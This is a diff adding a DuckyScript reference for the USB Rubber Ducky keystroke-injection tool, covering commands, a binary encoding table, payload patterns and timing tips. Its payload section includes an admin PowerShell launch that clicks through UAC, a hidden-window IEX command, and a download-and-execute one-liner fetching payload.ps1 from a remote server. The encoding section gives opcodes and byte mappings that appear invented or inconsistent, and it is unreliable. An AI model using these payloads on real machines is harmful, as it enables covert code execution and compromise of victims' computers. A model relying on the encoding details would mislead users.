@@ -1,0 +1,200 @@
+USB RUBBER DUCKY DUCKYSCRIPT SYNTAX REFERENCE
+================================================
+
+1. BASIC COMMANDS
+-----------------
+
+REM - Comment line, ignored during execution
+    Example: REM This is a comment
+
+STRING - Types the following text as if typed on keyboard
+    Example: STRING Hello World
+
+DELAY - Pause execution for specified milliseconds
+    Example: DELAY 500
+
+ENTER - Presses the Enter/Return key
+    Example: ENTER
+
+TAB - Presses the Tab key
+    Example: TAB
+
+SPACE - Presses the Space bar
+    Example: SPACE
+
+GUI - Windows key (Linux Super key, Mac Command key)
+    Example: GUI
+    
+ALT - Alt key modifier
+    Example: ALT F4
+
+CTRL - Control key modifier
+    Example: CTRL ALT DELETE
+
+SHIFT - Shift key modifier
+    Example: SHIFT a
+
+COMBINATIONS:
+GUI r - Opens Run dialog (Windows)
+ALT F4 - Close window
+CTRL c - Copy
+CTRL v - Paste
+CTRL a - Select all
+
+
+2. ENCODING FORMAT
+------------------
+
+The USB Rubber Ducky uses binary encoding where each DuckyScript command
+is translated to hexadecimal opcodes.
+
+OPCODE REFERENCE:
+0x00 = STRING command (followed by ASCII character bytes)
+0x13 = DELAY command (followed by 2-byte duration in milliseconds)
+0x16 = GUI key press
+0x28 = ENTER key
+0x2B = TAB key
+0x2C = SPACE key
+0x04-0x1D = Letter keys (0x04=a, 0x05=b, etc.)
+0x1E-0x27 = Number keys (0x1E=1, 0x1F=2, etc.)
+0x3A-0x45 = Function keys (0x3A=F1, 0x3B=F2, etc.)
+0x4F = RIGHT ARROW
+0x50 = LEFT ARROW
+0x51 = DOWN ARROW
+0x52 = UP ARROW
+
+MODIFIER KEYS:
+0x80 = Left CTRL
+0x81 = Left SHIFT
+0x82 = Left ALT
+0x83 = Left GUI/Windows key
+
+ENCODING STRUCTURE:
+Each line of DuckyScript is encoded as:
+[OPCODE] [PARAMETERS...]
+
+For STRING commands:
+0x00 [ASCII byte 1] [ASCII byte 2] ... 0x00
+
+For key combinations:
+[MODIFIER + KEY] where values are OR'd together
+
+
+3. COMMON PAYLOAD PATTERNS
+---------------------------
+
+OPEN COMMAND PROMPT:
+GUI r
+DELAY 100
+STRING cmd
+ENTER
+
+OPEN POWERSHELL:
+GUI r
+DELAY 100
+STRING powershell
+ENTER
+
+OPEN POWERSHELL AS ADMIN:
+GUI r
+DELAY 100
+STRING powershell
+CTRL SHIFT ENTER
+DELAY 500
+ALT y
+
+RUN POWERSHELL COMMAND:
+GUI r
+DELAY 100
+STRING powershell -windowstyle hidden -command "IEX(command)"
+ENTER
+
+FILE OPERATIONS:
+STRING copy C:\source.txt C:\destination.txt
+ENTER
+
+NETWORK COMMANDS:
+STRING curl http://example.com/data
+ENTER
+
+DOWNLOAD AND EXECUTE:
+STRING powershell -w hidden IEX(New-Object Net.WebClient).DownloadString('http://server.com/payload.ps1')
+ENTER
+
+
+4. SPECIAL CHARACTERS AND HEX REPRESENTATIONS
+----------------------------------------------
+
+In STRING encoding, special characters are represented as:
+
+Space = 0x2C or within STRING as 0x20
+! = 0x1E with SHIFT (0x81)
+@ = 0x1F with SHIFT
+# = 0x20 with SHIFT
+$ = 0x21 with SHIFT
+% = 0x22 with SHIFT
+^ = 0x23 with SHIFT
+& = 0x24 with SHIFT
+* = 0x25 with SHIFT
+( = 0x26 with SHIFT
+) = 0x27 with SHIFT
+- = 0x2D
+_ = 0x2D with SHIFT
+= = 0x2E
++ = 0x2E with SHIFT
+[ = 0x2F
+] = 0x30
+\ = 0x31
+; = 0x33
+' = 0x34
+, = 0x36
+. = 0x37
+/ = 0x38
+: = 0x33 with SHIFT
+
+Letters (lowercase):
+a-z = 0x04 to 0x1D
+
+Letters (uppercase):
+A-Z = 0x04 to 0x1D with SHIFT modifier (0x81)
+
+Numbers:
+1-9 = 0x1E to 0x26
+0 = 0x27
+
+
+5. EXAMPLE: HELLO WORLD
+------------------------
+
+DUCKYSCRIPT:
+REM Open Notepad and type Hello World
+GUI r
+DELAY 200
+STRING notepad
+ENTER
+DELAY 500
+STRING Hello World
+ENTER
+
+BINARY HEX REPRESENTATION:
+16 15 00 00          // GUI r
+13 C8 00             // DELAY 200
+00 6E 6F 74 65 70 61 64 00  // STRING notepad
+28 00                // ENTER
+13 F4 01             // DELAY 500
+00 48 65 6C 6C 6F 20 57 6F 72 6C 64 00  // STRING Hello World
+28 00                // ENTER
+
+
+TIMING CONSIDERATIONS:
+----------------------
+Always include appropriate DELAY commands between operations to ensure
+the target system has time to respond. Recommended delays:
+
+- After GUI r: 100-200ms
+- After opening applications: 500-1000ms
+- After ENTER for commands: 200-500ms
+- Before typing into newly opened windows: 500ms
+
+Insufficient delays may cause commands to execute before the system is ready,
+resulting in payload failure.
